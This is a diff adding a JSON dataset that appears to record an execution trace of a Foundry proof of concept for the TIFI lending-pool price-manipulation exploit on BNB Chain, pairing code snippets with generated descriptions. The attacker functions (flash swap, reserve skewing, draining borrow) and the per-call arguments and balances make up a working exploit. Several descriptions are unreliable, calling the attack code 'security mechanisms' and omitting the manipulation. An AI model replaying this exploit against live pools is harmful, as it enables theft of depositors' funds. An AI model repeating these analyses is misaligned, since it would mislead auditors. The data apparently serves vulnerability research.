@@ -1,0 +1,492 @@
+[
+    {
+        "id": "1027201",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        WBNB.approve(address(TIFIRouter), type(uint256).max);\n        BUSD.approve(address(TIFI), type(uint256).max);\n        TIFIToken.approve(address(Router), type(uint256).max);\n        Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. Core functions:\n   The `testExploit` function is designed to simulate an exploit scenario in a decentralized finance (DeFi) environment. It involves approving maximum spending limits for three different tokens (WBNB, BUSD, and TIFIToken) to specific addresses (TIFIRouter, TIFI, and Router). After these approvals, the function performs a token swap using the `Pair.swap` method, exchanging a specified amount of tokens. Finally, it emits an event to log the attacker's WBNB balance after the exploit.\n\n2. Security mechanism:\n   The function does not explicitly include security mechanisms like access control or reentrancy guards. However, it uses the `approve` function to set spending limits for tokens, which is a common practice to manage token allowances. The function also emits an event to log the attacker's balance, which can be useful for monitoring and auditing purposes.\n\n3. Parameter Function:\n   - `WBNB.approve(address(TIFIRouter), type(uint256).max)`: This sets the maximum allowance for WBNB tokens to be spent by the TIFIRouter contract.\n   - `BUSD.approve(address(TIFI), type(uint256).max)`: This sets the maximum allowance for BUSD tokens to be spent by the TIFI contract.\n   - `TIFIToken.approve(address(Router), type(uint256).max)`: This sets the maximum allowance for TIFIToken to be spent by the Router contract.\n   - `Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1))`: This performs a token swap, exchanging 5 units of one token for 500 units of another token, with the swap being directed to the address of the current contract. The `new bytes(1)` parameter is likely used to pass additional data or instructions for the swap.\n\n4. Return description:\n   The function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's WBNB balance after the exploit. The balance is calculated by calling `WBNB.balanceOf(address(this))`, which retrieves the WBNB balance of the current contract address. The balance is then logged with a precision of 18 decimal places.\n\nIn summary, the `testExploit` function simulates an exploit by setting maximum token allowances, performing a token swap, and logging the attacker's WBNB balance. It lacks explicit security mechanisms but uses standard practices like token approvals and event logging.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24420",
+        "args": "0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24688",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "920111",
+        "args": "5000000000000000000 [5e18], 500000000000000000000 [5e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "29971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "822110",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18], 500000000000000000000 [5e20], 0x00",
+        "original_code": "    function pancakeCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));\n        WBNBToBUSD(); // change the reserve of WBNB - BUSD\n        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI))); //call getReserves of WBNB - BUSD LP and borrow TIFI TOKEN\n        TIFIToWBNB();\n        WBNB.transfer(address(Pair), 7 * 1e18);\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a specific type of transaction involving token swaps and borrowing. It performs a series of steps:  \n- Deposits a token (BUSD) into a system (TIFI).  \n- Executes a swap between WBNB and BUSD to adjust their reserves.  \n- Borrows another token (TIFIToken) from the system (TIFI).  \n- Converts the borrowed TIFIToken back to WBNB.  \n- Finally, transfers a fixed amount of WBNB to a designated address (Pair).  \n\n2. Security mechanism:  \n- The function is marked as `external`, meaning it can only be called from outside the contract, adding a layer of control.  \n- It relies on the balances of tokens held by the contract (`balanceOf(address(this))`) to ensure operations are based on actual available funds.  \n- The fixed transfer amount (`7 * 1e18`) suggests a predefined limit, reducing the risk of unexpected large transfers.  \n\n3. Parameter Function:  \n- `sender`: Represents the address initiating the transaction, ensuring the function knows who triggered it.  \n- `baseAmount` and `quoteAmount`: These likely represent the amounts of two tokens involved in the swap, helping determine the transaction size.  \n- `data`: Additional information passed to the function, which could include instructions or context for the transaction.  \n\n4. Return description:  \nThis function does not return any value. Instead, it performs a series of actions involving deposits, swaps, borrowing, and transfers, all aimed at achieving a specific financial operation.  \n\nIn summary, this function orchestrates a complex sequence of token operations, including deposits, swaps, borrowing, and transfers, while using security measures like external access control and balance checks to ensure safe execution.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "500000000000000000000 [5e20]"
+    },
+    {
+        "id": "98131",
+        "args": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 500000000000000000000 [5e20]",
+        "original_code": "  function deposit(ERC20 _token, uint256 _amount)\n    external\n    nonReentrant\n    updatePoolWithInterestsAndTimestamp(_token)\n  {\n    Pool storage pool = pools[address(_token)];\n    require(pool.status == PoolStatus.ACTIVE, \"TIFI: INVALID_POOL_STATE\");\n    require(_amount > 0, \"TIFI: INVALID_DEPOSIT_AMOUNT\");\n\n    // 1. Calculate liquidity share amount\n    uint256 shareAmount = calculateRoundDownLiquidityShareAmount(_token, _amount);\n\n    // 2. Mint TiFiPoolShare token to user equal to liquidity share amount\n    pool.shareToken.mint(msg.sender, shareAmount);\n\n    // 3. transfer user deposit liquidity to the pool\n    _token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    emit Deposit(address(_token), msg.sender, shareAmount, _amount);\n  }\n\n",
+        "description": "1. **Core functions**:  \n   The `deposit` function allows a user to deposit a specific amount of a token into a pool. It calculates the user's share of the pool based on the deposited amount, mints a corresponding share token to the user, and transfers the deposited tokens into the pool. This function ensures the pool is active and the deposit amount is valid before proceeding.\n\n2. **Security mechanism**:  \n   - `nonReentrant`: Prevents reentrancy attacks by ensuring the function cannot be called again before it completes.  \n   - `updatePoolWithInterestsAndTimestamp(_token)`: Updates the pool's state with accrued interests and the latest timestamp to ensure accurate calculations.  \n   - `require` statements: Validate that the pool is active and the deposit amount is greater than zero, preventing invalid operations.  \n   - `safeTransferFrom`: Safely transfers tokens from the user to the pool, reducing the risk of errors or vulnerabilities.\n\n3. **Parameter Function**:  \n   - `_token`: Specifies the token (ERC20) being deposited into the pool.  \n   - `_amount`: Represents the quantity of the token the user wants to deposit.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it performs actions:  \n   - Calculates the user's share of the pool based on the deposited amount.  \n   - Mints share tokens to the user equal to their calculated share.  \n   - Transfers the deposited tokens into the pool.  \n   - Emits an event (`Deposit`) to log the transaction details, including the token address, user address, share amount, and deposited amount.  \n\nIn summary, the `deposit` function securely handles user deposits into a pool, calculates their share, and updates the pool's state while preventing reentrancy and invalid operations.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "2955460085154111597 [2.955e18]"
+    },
+    {
+        "id": "11603",
+        "args": "2159562446333066073713 [2.159e21], 2159472655120191753385 [2.159e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000970bb4c7e549614"
+    },
+    {
+        "id": "531",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "2955460085154111597 [2.955e18]"
+    },
+    {
+        "id": "2349",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2088224368140318413004 [2.088e21]"
+    },
+    {
+        "id": "29857",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 479364196066580060033 [4.793e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B, 500000000000000000000 [5e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5000000000000000000 [5e18]"
+    },
+    {
+        "id": "86892",
+        "args": "5000000000000000000 [5e18], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670657462 [1.67e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x76Fc4931d9d3A2054aEe2D59633E49b759277d69, 5000000000000000000 [5e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "639226751086086039 [6.392e17], 186324027613262851580 [1.863e20], 1670552189 [1.67e9]"
+    },
+    {
+        "id": "534",
+        "args": "0x76Fc4931d9d3A2054aEe2D59633E49b759277d69",
+        "original_code": null,
+        "description": null,
+        "return_value": "5639226751086086039 [5.639e18]"
+    },
+    {
+        "id": "60798",
+        "args": "0, 165166005723751869908 [1.651e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 165166005723751869908 [1.651e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x76Fc4931d9d3A2054aEe2D59633E49b759277d69",
+        "original_code": null,
+        "description": null,
+        "return_value": "5639226751086086039 [5.639e18]"
+    },
+    {
+        "id": "531",
+        "args": "0x76Fc4931d9d3A2054aEe2D59633E49b759277d69",
+        "original_code": null,
+        "description": null,
+        "return_value": "21158021889510981672 [2.115e19]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "165166005723751869908 [1.651e20]"
+    },
+    {
+        "id": "4826",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "529570181341490839170863757308 [5.295e29]"
+    },
+    {
+        "id": "432652",
+        "args": "0x17E65E6b9B166Fb8e7c59432F0db126711246BC0, 529570181341490839170863757308 [5.295e29]",
+        "original_code": "  function borrow(ERC20 _token, uint256 _amount)\n    external\n    nonReentrant\n    updatePoolWithInterestsAndTimestamp(_token)\n  {\n    Pool storage pool = pools[address(_token)];\n    require(pool.status == PoolStatus.ACTIVE, \"TIFI: INVALID_POOL_STATE\");\n    require(\n      _amount > 0 && _amount <= getTotalAvailableLiquidity(_token),\n      \"TIFI: INVALID_DEPOSIT_AMOUNT\"\n    );\n\n    // 1. calculate borrow share amount\n    uint256 borrowShare = calculateRoundUpBorrowShareAmount(_token, _amount);\n\n    // 2. update pool state\n    pool.totalBorrows += _amount;\n    pool.totalBorrowShares += borrowShare;\n\n    // 3. update user state\n    UserPoolData storage userData = userPoolData[msg.sender][address(_token)];\n    userData.borrowShares += borrowShare;\n\n    // 4. transfer borrowed token from pool to user\n    _token.safeTransfer(msg.sender, _amount);\n\n    // 5. check account health, this transaction will revert if the account of this user is not healthy\n    require(isAccountHealthy(msg.sender), \"TIFI: ACCOUNT_UNHEALTHY\");\n    emit Borrow(address(_token), msg.sender, borrowShare, _amount);\n  }\n\n",
+        "description": "1. **Core functions:**  \n   The `borrow` function allows a user to borrow a specified amount of tokens from a pool. It checks if the pool is active and if the requested amount is valid. It then calculates the user's share of the borrowed amount, updates the pool and user data, transfers the tokens to the user, and ensures the user's account remains healthy after the transaction.\n\n2. **Security mechanism:**  \n   - `nonReentrant`: Prevents reentrancy attacks by ensuring the function cannot be called again before it completes.  \n   - `updatePoolWithInterestsAndTimestamp`: Updates the pool state with accrued interest and the latest timestamp to ensure accurate calculations.  \n   - Input validation: Checks if the pool is active and if the requested amount is within available liquidity.  \n   - Account health check: Ensures the user's account remains healthy after borrowing, reverting the transaction if not.  \n\n3. **Parameter Function:**  \n   - `_token`: Specifies the type of token the user wants to borrow.  \n   - `_amount`: The amount of tokens the user wishes to borrow. It must be greater than zero and within the available liquidity of the pool.  \n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it updates the pool and user data, transfers tokens to the user, and emits an event (`Borrow`) containing details of the transaction, such as the token address, user address, borrow share, and borrowed amount.  \n\nIn summary, the `borrow` function enables users to borrow tokens from a pool while ensuring security through reentrancy protection, input validation, and account health checks. It updates the pool and user states and transfers the borrowed tokens to the user.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "826",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "529570181341490839170863757308 [5.295e29]"
+    },
+    {
+        "id": "7248",
+        "args": "114420318072385033241904288740 [1.144e29], 643987088113859874410712840615 [6.439e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000004823ece617efed"
+    },
+    {
+        "id": "826",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "529570181341490839170863757308 [5.295e29]"
+    },
+    {
+        "id": "231921",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 529570181341490839170863757308 [5.295e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2629",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2349",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "643878589086481307977993742498 [6.438e29]"
+    },
+    {
+        "id": "826",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2294",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000a688906bd8b0000"
+    },
+    {
+        "id": "2359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"
+    },
+    {
+        "id": "11776",
+        "args": "0x17E65E6b9B166Fb8e7c59432F0db126711246BC0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000b9fb8c9"
+    },
+    {
+        "id": "2517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "212990599625028683009998010901 [2.129e29], 41620007571712541416 [4.162e19], 1670657312 [1.67e9]"
+    },
+    {
+        "id": "289",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "2629",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2349",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "12777404427770228227 [1.277e19]"
+    },
+    {
+        "id": "2534",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "17996812473994407 [1.799e16]"
+    },
+    {
+        "id": "629",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "479364196066580060033 [4.793e20]"
+    },
+    {
+        "id": "349",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2567588564206898473037 [2.567e21]"
+    },
+    {
+        "id": "531",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "502955460085154111597 [5.029e20]"
+    },
+    {
+        "id": "2294",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000bcbce7f1b150000"
+    },
+    {
+        "id": "359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"
+    },
+    {
+        "id": "7452",
+        "args": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000038670bd005fe178"
+    },
+    {
+        "id": "517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5639226751086086039 [5.639e18], 21158021889510981672 [2.115e19], 1670657462 [1.67e9]"
+    },
+    {
+        "id": "2425",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "2629",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2349",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6073190929683880010801 [6.073e21]"
+    },
+    {
+        "id": "2531",
+        "args": "0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B",
+        "original_code": null,
+        "description": null,
+        "return_value": "6582761039314730454 [6.582e18]"
+    },
+    {
+        "id": "1190",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "529570181341490839170863757308 [5.295e29]"
+    },
+    {
+        "id": "173617",
+        "args": "529570181341490839170863757308 [5.295e29], 0, [0x17E65E6b9B166Fb8e7c59432F0db126711246BC0, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670657462 [1.67e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "96554",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xB62BB233Af2F83028Be19626256A9894B68AAe5E, 529570181341490839170863757308 [5.295e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "9410203327849838598281348720206 [9.41e30], 1805343251394136145403 [1.805e21], 1670657312 [1.67e9]"
+    },
+    {
+        "id": "826",
+        "args": "0xB62BB233Af2F83028Be19626256A9894B68AAe5E",
+        "original_code": null,
+        "description": null,
+        "return_value": "9929182105564499620668795202368 [9.929e30]"
+    },
+    {
+        "id": "62634",
+        "args": "0, 94138130026273038368 [9.413e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 94138130026273038368 [9.413e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "826",
+        "args": "0xB62BB233Af2F83028Be19626256A9894B68AAe5E",
+        "original_code": null,
+        "description": null,
+        "return_value": "9929182105564499620668795202368 [9.929e30]"
+    },
+    {
+        "id": "534",
+        "args": "0xB62BB233Af2F83028Be19626256A9894B68AAe5E",
+        "original_code": null,
+        "description": null,
+        "return_value": "1711205121367863107035 [1.711e21]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94138130026273038368 [9.413e19]"
+    },
+    {
+        "id": "3262",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 7000000000000000000 [7e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "317794294056683800498256 [3.177e23]"
+    },
+    {
+        "id": "531",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "91180607404360225026452851 [9.118e25]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "87138130026273038368 [8.713e19]"
+    }
+]
